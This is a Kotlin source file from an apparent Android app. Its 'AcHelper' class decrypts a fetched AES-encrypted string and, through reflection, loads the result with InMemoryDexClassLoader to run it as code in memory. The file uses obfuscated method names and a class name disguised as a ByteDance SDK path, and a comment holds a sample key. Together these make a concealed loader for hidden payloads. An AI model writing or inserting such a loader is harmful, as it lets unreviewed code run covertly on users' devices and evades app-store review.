package com.charm.refined.helper

import android.content.Context
import android.util.Log
import java.lang.reflect.Constructor
import java.nio.ByteBuffer
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

/**
 * Date：2025/12/3
 * Describe:
 */
class AcHelper : BaseHelper() {
    private var mBuff: Any? = null

    fun action(str: String, context: Context) {
        // todo test
//        Class.forName("com.ozop.impI.Core")
//            .getMethod("init", Context::class.java)
//            .invoke(null, context)
//        return
        val key = str.split("-")[0]//0918qqijTYSH123P
        nameStr = str.split("-")[1] //com.bytedance.sdk.component.WF.PAi
        val s = fetchStr()
        if (s.isBlank()) return
        mBuff = ByteBuffer.wrap(byDec(s, key.toByteArray()))

        dex(context)
    }

    private fun byDec(inStr: String, keyAes: ByteArray): ByteArray {
        val inputBytes = fe(inStr)
        val key = SecretKeySpec(keyAes, "AES")
        val cipher = Cipher.getInstance("AES")
        cipher.init(Cipher.DECRYPT_MODE, key)
        val outputBytes = cipher.doFinal(inputBytes)
        return outputBytes
    }

    override fun fetBuffer(): Any {
        return mBuff ?: ""
    }

    override fun decla(string: String): Constructor<*> {
        val clazz = Class.forName("dalvik.system.InMemoryDexClassLoader")
        return clazz.getDeclaredConstructor(
            Class.forName("java.nio.ByteBuffer"), Class.forName("java.lang.ClassLoader")
        )
    }


}